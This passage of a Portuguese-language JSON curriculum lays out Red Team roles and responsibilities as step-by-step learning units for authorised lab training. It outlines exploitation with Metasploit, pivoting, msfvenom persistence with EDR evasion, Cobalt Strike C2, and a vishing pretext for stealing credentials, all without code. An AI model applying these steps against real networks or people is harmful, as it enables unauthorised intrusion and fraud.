                                  "tips": "ROE previne danos reais; torne-as específicas e mensuráveis.",
                                  "learningObjective": "Ao final, você será capaz de criar e justificar ROE aprovadas pelo Red Team Leader.",
                                  "commonMistakes": "Fazer ROE muito vagas, levando a riscos desnecessários."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Descrever a Supervisão Geral das Operações",
                                  "subSteps": [
                                    "Explique monitoramento em tempo real: dashboards, reuniões diárias.",
                                    "Detalhe debriefings intermediários e ajustes táticos.",
                                    "Aborde relatórios finais: lições aprendidas, recomendações para Blue Team.",
                                    "Inclua gerenciamento de equipe: motivação, alocação de recursos.",
                                    "Discuta encerramento seguro da operação e lições pós-mortem."
                                  ],
                                  "verification": "Redija um relatório de supervisão fictício cobrindo todas as fases operacionais.",
                                  "estimatedTime": "35 minutos",
                                  "materials": "Templates de relatórios de Red Team, ferramentas de colaboração como Slack ou Microsoft Teams.",
                                  "tips": "Use métricas quantitativas (ex: tempo de detecção) na supervisão para objetividade.",
                                  "learningObjective": "Você dominará como o líder supervisiona operações de ponta a ponta.",
                                  "commonMistakes": "Focar só em sucesso técnico; inclua aspectos humanos e éticos."
                                }
                              ],
                              "practicalExample": "Em uma simulação para uma banco fictício, o Red Team Leader planeja um ataque de phishing seguido de ransomware simulado, aprova ROE limitando a rede interna sem dados reais de clientes, supervisiona a execução via dashboard diário e entrega relatório final recomendando melhorias em autenticação multifator.",
                              "finalVerifications": [
                                "Pode descrever verbalmente o papel completo em 2 minutos.",
                                "Lista todas as funções principais sem consultar notas.",
                                "Cria um fluxograma preciso do ciclo de vida de uma operação liderada.",
                                "Explica diferenças entre planejamento estratégico e supervisão tática.",
                                "Identifica 3 riscos éticos e como o líder os mitiga.",
                                "Produz um resumo escrito de 300 palavras descrevendo o papel."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude das funções descritas (90% cobertura).",
                                "Clareza e estrutura na explicação (uso de exemplos concretos).",
                                "Profundidade no planejamento estratégico e ROE.",
                                "Integração de aspectos éticos e legais.",
                                "Capacidade de conectar ao contexto maior de cibersegurança.",
                                "Criatividade em exemplos práticos e verificações."
                              ],
                              "crossCurricularConnections": [
                                "Gestão de Projetos (PMBOK para planejamento).",
                                "Liderança e Trabalho em Equipe (motivação de analistas).",
                                "Ética Profissional (conformidade legal em simulações).",
                                "Comunicação Técnica (relatórios e debriefings).",
                                "Análise de Riscos (identificação de ameaças)."
                              ],
                              "realWorldApplication": "No mundo real, o Red Team Leader coordena operações em empresas como Google ou governos, testando defesas contra APTs, resultando em fortalecimento de segurança e conformidade regulatória, como visto em exercícios da NSA ou CERTs nacionais."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.2.2",
                            "name": "Detalhar funções do Red Team Operator",
                            "description": "Identificar as tarefas do operador, incluindo execução de exploits, pivoting e persistência em ambientes de teste, utilizando ferramentas de ethical hacking conforme Simpson et al.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Papel Geral e Responsabilidades do Red Team Operator",
                                  "subSteps": [
                                    "Leia documentação sobre Red Team Operations de Simpson et al., focando em definições de Operator.",
                                    "Liste as responsabilidades principais: reconnaissance, exploitation, pivoting e persistence.",
                                    "Compare com outros papéis no Red Team (e.g., Leader vs. Operator).",
                                    "Crie um fluxograma das tarefas diárias em uma operação simulada.",
                                    "Discuta em fórum ou com mentor as variações em cenários reais."
                                  ],
                                  "verification": "Fluxograma completo submetido e revisado, cobrindo pelo menos 80% das tarefas listadas em Simpson et al.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Livro/PDF de Simpson et al., papel ou ferramenta de diagramação como Draw.io, acesso a fóruns de ethical hacking.",
                                  "tips": "Use mind maps para visualizar hierarquias de responsabilidades.",
                                  "learningObjective": "Identificar e articular 5-7 funções principais do Red Team Operator.",
                                  "commonMistakes": [
                                    "Confundir com Blue Team roles.",
                                    "Ignorar contexto ético/legal.",
                                    "Listar tarefas genéricas sem especificidade técnica."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Dominar Execução de Exploits em Ambientes de Teste",
                                  "subSteps": [
                                    "Configure um lab com VMs vulneráveis (e.g., Metasploitable).",
                                    "Instale e explore ferramentas como Metasploit e Nmap.",
                                    "Identifique vulnerabilidades via scanning e selecione exploits apropriados.",
                                    "Execute exploits em alvos simulados e documente payloads usados.",
                                    "Registre logs de sucesso/falha para análise."
                                  ],
                                  "verification": "Relatório com screenshots de shell obtido via exploit em pelo menos 2 VMs.",
                                  "estimatedTime": "4 horas",
                                  "materials": "Kali Linux VM, Metasploitable VMs, Metasploit Framework, VirtualBox/VMware.",
                                  "tips": "Sempre use --dry-run primeiro para testar exploits sem impacto.",
                                  "learningObjective": "Executar exploits com 90% de sucesso em labs controlados.",
                                  "commonMistakes": [
                                    "Executar sem scanning prévio.",
                                    "Não isolar rede do lab.",
                                    "Ignorar atualizações de signatures em AV simulados."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Aprender Técnicas de Pivoting para Expansão Lateral",
                                  "subSteps": [
                                    "Estude conceitos de pivoting (port forwarding, SOCKS proxy).",
                                    "Configure pivoting com Meterpreter no Metasploit.",
                                    "Pivote de um host comprometido para rede interna simulada.",
                                    "Teste acesso a serviços remotos via pivot e escaneie novos hosts.",
                                    "Otimize rotas de pivoting para minimizar latência."
                                  ],
                                  "verification": "Demonstração de acesso a host interno via pivot, com nmap output de rede pivoteada.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Mesmas VMs do Step 2, mais rede interna configurada (e.g., 192.168.2.0/24).",
                                  "tips": "Use autoroute module no Meterpreter para automação.",
                                  "learningObjective": "Implementar pivoting em 3 cenários de rede diferentes.",
                                  "commonMistakes": [
                                    "Firewall rules bloqueando pivots.",
                                    "IPs hardcoded em vez de dinâmicos.",
                                    "Excesso de tráfego gerando detecção."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Técnicas de Persistência em Sistemas Comprometidos",
                                  "subSteps": [
                                    "Explore métodos de persistence (backdoors, scheduled tasks, registry keys).",
                                    "Crie payloads persistentes com msfvenom para Windows/Linux.",
                                    "Instale persistence em hosts pivoteados e teste reboot.",
                                    "Monitore estabilidade e evite detecção com rootkits simulados.",
                                    "Documente remoção/cleanup procedures éticas."
                                  ],
                                  "verification": "Vídeo ou log mostrando shell pós-reboot em host persistente.",
                                  "estimatedTime": "3 horas",
                                  "materials": "VMs Windows/Linux vulneráveis, msfvenom, Empire framework opcional.",
                                  "tips": "Teste em snapshots de VM para fácil reversão.",
                                  "learningObjective": "Estabelecer persistence que sobreviva a 3 reboots sem detecção imediata.",
                                  "commonMistakes": [
                                    "Payloads óbvios detectados por EDR.",
                                    "Falta de cleanup levando a labs poluídos.",
                                    "Persistência em locais errados (e.g., temp dirs)."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Integrar Funções em uma Simulação Completa de Red Team Operation",
                                  "subSteps": [
                                    "Planeje uma operação full: recon > exploit > pivot > persistence.",
                                    "Execute end-to-end em lab multi-máquina.",
                                    "Registre relatório com timestamps, ferramentas e lições aprendidas.",
                                    "Avalie detecção por Blue Team simulado.",
                                    "Refine baseado em feedback."
                                  ],
                                  "verification": "Relatório final de operação com todas fases documentadas e bem-sucedidas.",
                                  "estimatedTime": "4 horas",
                                  "materials": "Lab completo com 4+ VMs, ferramentas dos steps anteriores.",
                                  "tips": "Registre tudo em ELK stack ou similar para análise pós-op.",
                                  "learningObjective": "Executar ciclo completo de Operator tasks em simulação realista.",
                                  "commonMistakes": [
                                    "Pular fases de recon.",
                                    "Não simular defesas adversárias.",
                                    "Relatórios incompletos."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com servidor web vulnerável (DVWA), servidor interno DB e workstation: escaneie e explore DVWA com SQLi via Metasploit, pivote para DB server via Meterpreter portfwd, estabeleça persistence com backdoor no DB, e acesse workstation pós-reboot.",
                              "finalVerifications": [
                                "Liste corretamente 7+ tarefas do Red Team Operator de Simpson et al.",
                                "Demonstre exploit + pivot + persistence em vídeo de lab.",
                                "Crie fluxograma preciso das funções integradas.",
                                "Explique ethical boundaries em relatório escrito.",
                                "Passe quiz com 90% acurácia sobre ferramentas usadas.",
                                "Cleanup completo do lab sem vestígios."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de funções (0-20%)",
                                "Profundidade técnica em demos (0-25%)",
                                "Qualidade de documentação e relatórios (0-20%)",
                                "Sucesso em simulações práticas (0-20%)",
                                "Consciência ética e cleanup (0-10%)",
                                "Criatividade em conexões reais (0-5%)"
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Fundamentos de routing e firewalls para pivoting.",
                                "Programação: Scripting em Python/Bash para custom exploits.",
                                "Análise Forense: Entender detecção de persistence.",
                                "Gestão de Projetos: Planejamento de operações Red Team."
                              ],
                              "realWorldApplication": "Em pentests contratados, Red Team Operators simulam ataques persistentes em redes corporativas para identificar fraquezas, permitindo que organizações fortaleçam defesas antes de incidentes reais, como em certificações OSCP ou empregos em firmas de cybersecurity."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.2.1.1"
                            ]
                          },
                          {
                            "id": "10.1.1.2.2.3",
                            "name": "Explicar o papel do Social Engineer",
                            "description": "Descrever como o social engineer simula engenharia social para obter acesso inicial, integrando-se às operações do Red Team em jogos de guerra cibernética.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Fundamentos da Engenharia Social",
                                  "subSteps": [
                                    "Pesquise a definição de engenharia social como manipulação psicológica para induzir ações indesejadas.",
                                    "Identifique os princípios psicológicos subjacentes, como autoridade, urgência e reciprocidade.",
                                    "Analise exemplos históricos famosos, como o caso Kevin Mitnick.",
                                    "Diferencie engenharia social de ataques técnicos puros.",
                                    "Liste os riscos que ela representa em ambientes cibernéticos."
                                  ],
                                  "verification": "Crie um diagrama resumindo os princípios e exemplos, e explique verbalmente para um par.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Acesso à internet para pesquisa (Wikipedia, OWASP)",
                                    "Papel e caneta ou ferramenta de diagramação como Draw.io"
                                  ],
                                  "tips": [
                                    "Use fontes confiáveis como MITRE ATT&CK para engenharia social.",
                                    "Foquem em aspectos humanos, não técnicos."
                                  ],
                                  "learningObjective": "Compreender o conceito base de engenharia social e sua relevância em cibersegurança.",
                                  "commonMistakes": [
                                    "Confundir com hacking técnico.",
                                    "Ignorar o fator humano como o elo mais fraco."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Descrever o Papel Específico do Social Engineer no Red Team",
                                  "subSteps": [
                                    "Defina o Red Team como simuladores de ataques adversários em jogos de guerra cibernética.",
                                    "Explique que o Social Engineer foca no acesso inicial via manipulação humana.",
                                    "Descreva responsabilidades: pesquisa OSINT, criação de personas, execução de simulações.",
                                    "Compare com outros papéis no Red Team (ex: exploit developer).",
                                    "Discuta o ciclo de vida: planejamento, execução, relatório."
                                  ],
                                  "verification": "Escreva um parágrafo descrevendo o papel em 100 palavras e valide com um checklist de responsabilidades.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação de frameworks Red Team (ex: MITRE ATT&CK Tactic TA0001)",
                                    "Notebook para anotações"
                                  ],
                                  "tips": [
                                    "Enfatize a integração com o time: Social Engineer não age sozinho.",
                                    "Use analogias como 'atalho pela porta dos fundos humana'."
                                  ],
                                  "learningObjective": "Articular com precisão o papel único do Social Engineer dentro das operações de Red Team.",
                                  "commonMistakes": [
                                    "Superestimar impacto isolado sem contexto de equipe.",
                                    "Confundir com Black Hat hackers reais."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Técnicas e Estratégias do Social Engineer",
                                  "subSteps": [
                                    "Liste técnicas comuns: phishing, vishing, pretexting, quid pro quo, tailgating.",
                                    "Simule uma técnica simples, como crafting um email de phishing.",
                                    "Analise defesas: conscientização, políticas de verificação.",
                                    "Discuta ferramentas: SET (Social-Engineer Toolkit), OSINT tools como Maltego.",
                                    "Pratique role-playing uma interação social engineering."
                                  ],
                                  "verification": "Demonstre uma técnica em um ambiente simulado seguro e grave um vídeo curto explicando-a.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Social-Engineer Toolkit (em VM isolada)",
                                    "Ambiente de simulação como TryHackMe ou HTB Academy"
                                  ],
                                  "tips": [
                                    "Sempre obtenha autorização ética em simulações.",
                                    "Registre tudo para relatórios de Red Team."
                                  ],
                                  "learningObjective": "Dominar técnicas práticas usadas pelo Social Engineer para acesso inicial.",
                                  "commonMistakes": [
                                    "Usar técnicas reais sem sandbox.",
                                    "Ignorar leis como LGPD ou GDPR em simulações."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar o Papel do Social Engineer às Operações de Jogos de Guerra Cibernética",
                                  "subSteps": [
                                    "Explique como o acesso inicial habilita escalada de privilégios e pivoting.",
                                    "Descreva fases: reconnaissance, initial access (social), execution, persistence.",
                                    "Analise um case study de Red Team exercise envolvendo social engineering.",
                                    "Discuta métricas de sucesso: tempo para acesso, impacto simulado.",
                                    "Aborde debriefing e lições aprendidas para Blue Team."
                                  ],
                                  "verification": "Crie um fluxograma mostrando integração do Social Engineer no ciclo de ataque Red Team.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Case studies de relatórios Red Team públicos (ex: DEF CON reports)",
                                    "Ferramenta de fluxograma como Lucidchart"
                                  ],
                                  "tips": [
                                    "Ligue ao framework MITRE para credibilidade.",
                                    "Enfatize valor em jogos de guerra realistas."
                                  ],
                                  "learningObjective": "Compreender como o Social Engineer se integra ao fluxo completo de operações Red Team.",
                                  "commonMistakes": [
                                    "Isolar social engineering do ataque técnico.",
                                    "Subestimar relatório pós-exercício."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernética para uma empresa bancária, o Social Engineer usa OSINT para descobrir o hobby de um funcionário (futebol), cria uma persona de olheiro de time e liga fingindo recrutar o filho dele, obtendo credenciais via vishing. Isso concede acesso inicial à rede, permitindo ao Red Team prosseguir com exploits.",
                              "finalVerifications": [
                                "Explique verbalmente o papel completo em 2 minutos sem notas.",
                                "Identifique 5 técnicas de engenharia social e uma defesa para cada.",
                                "Monte um fluxograma simples de integração Red Team.",
                                "Discuta ética e legalidade em um cenário hipotético.",
                                "Avalie um case study e sugira melhorias.",
                                "Responda a 10 perguntas de quiz sobre conceitos chave."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição e distinção de conceitos (30%)",
                                "Profundidade nas técnicas e exemplos práticos (25%)",
                                "Clareza na integração com Red Team operations (20%)",
                                "Uso correto de terminologia e frameworks (15%)",
                                "Demonstração de verificações éticas e legais (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Psicologia: Princípios de influência (Cialdini).",
                                "Comunicações: Técnicas de persuasão e role-playing.",
                                "Ética e Direito: Regulamentações de privacidade (LGPD/GDPR).",
                                "Inteligência Artificial: Uso de OSINT e ferramentas automatizadas.",
                                "Gestão de Projetos: Planejamento de operações Red Team."
                              ],
                              "realWorldApplication": "Em pentests profissionais, Social Engineers de firmas como Mandiant ou CrowdStrike simulam ataques reais para treinar equipes de defesa, identificando vulnerabilidades humanas que representam 74% das brechas (Verizon DBIR), melhorando resiliência organizacional contra APTs."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.2.2.1"
                            ]
                          },
                          {
                            "id": "10.1.1.2.2.4",
                            "name": "Definir o analista de inteligência",
                            "description": "Analisar o papel do analista no Red Team para coleta de inteligência pré-operacional e monitoramento de indicadores de compromisso durante simulações.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o contexto e o papel geral do analista de inteligência no Red Team",
                                  "subSteps": [
                                    "Estude a definição de Red Team em operações cibernéticas e sua diferença de Blue Team.",
                                    "Identifique as fases de uma simulação cibernética: pré-operacional, operacional e pós-operacional.",
                                    "Descreva o analista de inteligência como o responsável por fornecer dados acionáveis à equipe.",
                                    "Compare com outros papéis como o operador de ataque ou líder de equipe.",
                                    "Liste responsabilidades principais: coleta, análise e disseminação de inteligência."
                                  ],
                                  "verification": "Escreva um resumo de 200 palavras definindo o papel e suas diferenças de outros membros do Red Team.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação MITRE ATT&CK",
                                    "Vídeos introdutórios sobre Red Team (YouTube ou plataformas como Cybrary)",
                                    "Artigo sobre estrutura de equipes de pentest"
                                  ],
                                  "tips": "Use frameworks como MITRE para contextualizar o papel de forma padronizada.",
                                  "learningObjective": "Entender o analista de inteligência como pilar de suporte estratégico no Red Team.",
                                  "commonMistakes": "Confundir com analista forense (foco pós-incidente) ou ignorar o aspecto proativo pré-operacional."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar a coleta de inteligência pré-operacional",
                                  "subSteps": [
                                    "Identifique fontes de inteligência: OSINT (redes sociais, WHOIS), HUMINT e dados de vulnerabilidades públicas.",
                                    "Aprenda técnicas de coleta: uso de ferramentas como Maltego, Shodan e Recon-ng.",
                                    "Realize análise inicial: priorize ameaças baseadas em TTPs (Tactics, Techniques, Procedures).",
                                    "Documente perfis de alvos: mapeie ativos, fraquezas e vetores de ataque potenciais.",
                                    "Valide dados coletados com cross-referência em múltiplas fontes."
                                  ],
                                  "verification": "Crie um relatório fictício de inteligência pré-operacional para um alvo simulado, listando 5 fontes e achados chave.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Ferramentas OSINT gratuitas (Shodan, theHarvester)",
                                    "Guia OSINT Framework",
                                    "Casos de estudo de Red Team operations"
                                  ],
                                  "tips": "Sempre priorize fontes abertas para evitar detecção precoce.",
                                  "learningObjective": "Dominar métodos para coletar e priorizar inteligência antes de operações.",
                                  "commonMistakes": "Coletar dados irrelevantes sem filtro ou subestimar a importância da validação cruzada."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar o monitoramento de indicadores de compromisso (IoCs) durante simulações",
                                  "subSteps": [
                                    "Defina IoCs: hashes de malware, IPs maliciosos, padrões de tráfego anômalos.",
                                    "Configure monitoramento: use SIEM, EDR ou ferramentas como Zeek e Suricata.",
                                    "Monitore em tempo real: detecte defesas ativadas e adapte táticas do Red Team.",
                                    "Registre IoCs observados: categorize por criticidade e impacto na simulação.",
                                    "Compartilhe alertas com a equipe para decisões operacionais ágeis."
                                  ],
                                  "verification": "Simule um cenário com IoCs conhecidos e liste 5 indicadores detectados com justificativa.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Lista de IoCs de amostras (VirusTotal)",
                                    "Ferramentas de monitoramento open-source (Wireshark, Zeek)",
                                    "Documentação MITRE sobre detecção"
                                  ],
                                  "tips": "Integre automação com scripts para alertas em tempo real.",
                                  "learningObjective": "Capacitar o monitoramento dinâmico de IoCs para suporte contínuo às operações.",
                                  "commonMistakes": "Ignorar falsos positivos ou falhar em correlacionar IoCs com TTPs adversários."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar inteligência em relatórios e lições aprendidas",
                                  "subSteps": [
                                    "Compile relatórios: estrutura com executivo summary, achados pré e durante operação.",
                                    "Dissemine inteligência: use canais seguros para a equipe Red Team e stakeholders.",
                                    "Avalie efetividade: meça como a inteligência impactou o sucesso da simulação.",
                                    "Identifique melhorias: atualize bases de inteligência com lições aprendidas.",
                                    "Pratique debriefing: discuta cenários reais de falhas de inteligência."
                                  ],
                                  "verification": "Elabore um relatório completo de inteligência para uma simulação hipotética, incluindo recomendações.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Templates de relatórios Red Team (SANS ou NIST)",
                                    "Exemplos de AAR (After Action Reports)"
                                  ],
                                  "tips": "Mantenha relatórios concisos e visuais com gráficos para maior impacto.",
                                  "learningObjective": "Habilitar a transformação de inteligência bruta em insights acionáveis e mensuráveis.",
                                  "commonMistakes": "Sobrecarregar relatórios com dados brutos sem análise ou omitir métricas de sucesso."
                                }
                              ],
                              "practicalExample": "Em uma simulação de ataque a uma empresa fictícia, o analista de inteligência usa OSINT para mapear servidores expostos via Shodan (pré-operacional), monitora IoCs como tráfego C2 durante a infiltração com Zeek, e alerta a equipe sobre detecção pelo Blue Team, permitindo pivotar para outro vetor.",
                              "finalVerifications": [
                                "Pode listar e explicar 5 responsabilidades chave do analista de inteligência.",
                                "Descreve corretamente fontes de inteligência pré-operacional e ferramentas associadas.",
                                "Identifica pelo menos 3 tipos de IoCs e métodos de monitoramento.",
                                "Cria um relatório de inteligência simples e estruturado.",
                                "Diferencia o papel de outros membros do Red Team com exemplos.",
                                "Explica o impacto da inteligência no sucesso de simulações."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude na descrição do papel (80% de acerto nos conceitos chave).",
                                "Qualidade dos exemplos práticos e relevância ao contexto Red Team.",
                                "Profundidade nos substeps e verificações pessoais demonstradas.",
                                "Uso correto de terminologia cibernética (OSINT, IoCs, TTPs).",
                                "Capacidade de integrar inteligência em cenários simulados.",
                                "Clareza e estrutura nos relatórios produzidos."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Técnicas de coleta e correlação de OSINT.",
                                "Inteligência Artificial: Uso de ML para detecção automatizada de IoCs.",
                                "Ética e Direito: Conformidade legal em coleta de inteligência aberta.",
                                "Gestão de Projetos: Integração de inteligência em ciclos operacionais."
                              ],
                              "realWorldApplication": "No setor de cibersegurança, analistas de inteligência em equipes de pentest (ex: firmas como Mandiant) coletam OSINT para assessments de risco e monitoram IoCs em exercícios de Red Team para empresas, ajudando a fortalecer defesas reais contra APTs."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.2.3",
                        "name": "Funções e Responsabilidades Específicas",
                        "description": "As funções abrangem planejamento de ataques, execução ética, relatórios de lições aprendidas e manutenção de conformidade, essenciais para o sucesso das operações ofensivas simuladas.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.2.3.1",
                            "name": "Listar responsabilidades operacionais",
                            "description": "Enumerar funções como reconnaissance, weaponization e command & control, adaptadas ao mindset do adversário em contextos de Red Team.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender as fases do ciclo de vida de um ataque cibernético",
                                  "subSteps": [
                                    "Estude o framework MITRE ATT&CK e o Cyber Kill Chain.",
                                    "Identifique as principais fases: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions on Objectives.",
                                    "Anote definições breves para cada fase.",
                                    "Compare com outros modelos como o Lockheed Martin Cyber Kill Chain.",
                                    "Crie um diagrama visual das fases."
                                  ],
                                  "verification": "Diagrama completo das fases com definições anotadas.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Framework MITRE ATT&CK (site oficial)",
                                    "Documentação Cyber Kill Chain (PDF)",
                                    "Ferramenta de diagramação como Draw.io"
                                  ],
                                  "tips": [
                                    "Comece pelo MITRE para precisão atualizada.",
                                    "Use cores para diferenciar fases pré e pós-exploração."
                                  ],
                                  "learningObjective": "Dominar as fases padrão de ataques cibernéticos para contextualizar responsabilidades.",
                                  "commonMistakes": [
                                    "Confundir fases como Delivery e Exploitation.",
                                    "Ignorar fases laterais como Lateral Movement."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear responsabilidades operacionais genéricas por fase",
                                  "subSteps": [
                                    "Para cada fase, liste 2-3 responsabilidades operacionais típicas.",
                                    "Exemplo Reconnaissance: Coleta de dados públicos, scanning de rede.",
                                    "Weaponization: Criação de payloads maliciosos.",
                                    "Command & Control: Estabelecimento de canais de comunicação persistentes.",
                                    "Documente em uma tabela: Fase | Responsabilidades."
                                  ],
                                  "verification": "Tabela com pelo menos 15 responsabilidades distribuídas nas fases.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Planilha Excel ou Google Sheets",
                                    "Referências MITRE ATT&CK Tactics",
                                    "Artigos sobre Cyber Kill Chain"
                                  ],
                                  "tips": [
                                    "Foque em ações operacionais, não estratégicas.",
                                    "Use verbos de ação como 'coletar', 'desenvolver', 'executar'."
                                  ],
                                  "learningObjective": "Associar ações específicas a cada fase do ataque.",
                                  "commonMistakes": [
                                    "Listar responsabilidades vagas como 'atacar'.",
                                    "Omitir fases como Persistence."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Adaptar responsabilidades ao mindset do adversário no Red Team",
                                  "subSteps": [
                                    "Analise o mindset adversário: sigilo, persistência, evasão de detecção.",
                                    "Adapte cada responsabilidade: ex. Reconnaissance com ferramentas stealth como OSINT.",
                                    "Inclua adaptações Red Team: simulação ética, relatórios de evidências.",
                                    "Priorize fases como C2 para controle em exercícios simulados.",
                                    "Revise a tabela adicionando coluna 'Adaptação Red Team'."
                                  ],
                                  "verification": "Tabela atualizada com coluna de adaptações para todas as responsabilidades.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentos de boas práticas Red Team (ex. NIST SP 800-115)",
                                    "Ferramentas OSINT como Maltego"
                                  ],
                                  "tips": [
                                    "Pense como um APT: lento, stealthy.",
                                    "Sempre inclua 'não deixar rastros' nas adaptações."
                                  ],
                                  "learningObjective": "Transformar responsabilidades genéricas em simuláveis no contexto Red Team.",
                                  "commonMistakes": [
                                    "Esquecer aspectos éticos do Red Team.",
                                    "Não enfatizar evasão de detecção."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Elaborar e refinar a lista final de responsabilidades operacionais",
                                  "subSteps": [
                                    "Compile todas as responsabilidades em uma lista numerada.",
                                    "Agrupe por fase e adicione descrições curtas (1-2 frases).",
                                    "Revise por completude: cubra todas as fases principais.",
                                    "Teste a lista com um cenário hipotético de Red Team.",
                                    "Formate como documento profissional."
                                  ],
                                  "verification": "Lista final com 20+ responsabilidades, formatada e testada em cenário.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Editor de texto Markdown ou Word",
                                    "Cenário de simulação Red Team (template)"
                                  ],
                                  "tips": [
                                    "Use bullet points para clareza.",
                                    "Inclua exemplos de ferramentas em cada item."
                                  ],
                                  "learningObjective": "Produzir uma lista acionável e completa de responsabilidades.",
                                  "commonMistakes": [
                                    "Lista muito genérica sem exemplos.",
                                    "Falta de agrupamento por fase."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício Red Team simulando um ataque APT, liste: Reconnaissance - Realizar OSINT com Shodan e theHarvester; Weaponization - Desenvolver exploit com Metasploit adaptado; Command & Control - Configurar C2 com Cobalt Strike para persistência stealth.",
                              "finalVerifications": [
                                "Lista cobre todas as 7 fases principais do Cyber Kill Chain.",
                                "Cada responsabilidade tem descrição adaptada ao Red Team.",
                                "Pelo menos 20 itens listados com exemplos de ferramentas.",
                                "Documento formatado profissionalmente.",
                                "Testado em um cenário hipotético sem lacunas.",
                                "Inclui mindset adversário em todas as adaptações."
                              ],
                              "assessmentCriteria": [
                                "Precisão e fidelidade aos frameworks MITRE/Cyber Kill Chain (30%)",
                                "Completude: cobertura de fases e número de responsabilidades (25%)",
                                "Adaptação ao contexto Red Team e mindset adversário (20%)",
                                "Clareza e estrutura da lista (15%)",
                                "Inclusão de exemplos práticos e ferramentas (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Inteligência de Ameaças (SC-02): Coleta de OSINT em Reconnaissance.",
                                "Ética e Governança (SC-10): Limites éticos em simulações Red Team.",
                                "Liderança e Gerenciamento de Equipes: Atribuição de funções operacionais.",
                                "Análise de Redes: Scanning e pivoting em fases iniciais.",
                                "Relatórios e Comunicação: Documentação de responsabilidades."
                              ],
                              "realWorldApplication": "Em operações reais de Red Team, como assessments para empresas, essa lista garante divisão clara de tarefas durante jogos de guerra cibernética, permitindo simulações realistas de ataques adversários e identificação de vulnerabilidades organizacionais."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.2.2.1"
                            ]
                          },
                          {
                            "id": "10.1.1.2.3.2",
                            "name": "Avaliar integração com Blue Team",
                            "description": "Explicar como as funções do Red Team se integram com o Blue Team para melhorar a defesa, incluindo debriefings e análise de cenários de ameaça.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Papéis Fundamentais do Red Team e Blue Team",
                                  "subSteps": [
                                    "Defina o Red Team como simuladores de atacantes cibernéticos que testam vulnerabilidades.",
                                    "Defina o Blue Team como defensores que monitoram, detectam e respondem a ameaças.",
                                    "Identifique objetivos compartilhados: melhorar a postura de defesa através de simulações realistas.",
                                    "Liste responsabilidades chave de cada equipe em um exercício de guerra cibernética.",
                                    "Compare diferenças e complementaridades entre as equipes."
                                  ],
                                  "verification": "Crie um diagrama simples comparando papéis e responsabilidades de Red e Blue Teams.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação de Red/Blue Team (ex: NIST SP 800-115), papel e caneta ou ferramenta de diagramação como Draw.io.",
                                  "tips": "Use analogias militares (Red como invasores, Blue como guardiões) para facilitar compreensão.",
                                  "learningObjective": "Diferenciar papéis e entender como eles se complementam para defesa cibernética.",
                                  "commonMistakes": "Confundir Red Team com hackers maliciosos; lembrar que é simulação ética."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear Pontos de Integração entre Red e Blue Teams",
                                  "subSteps": [
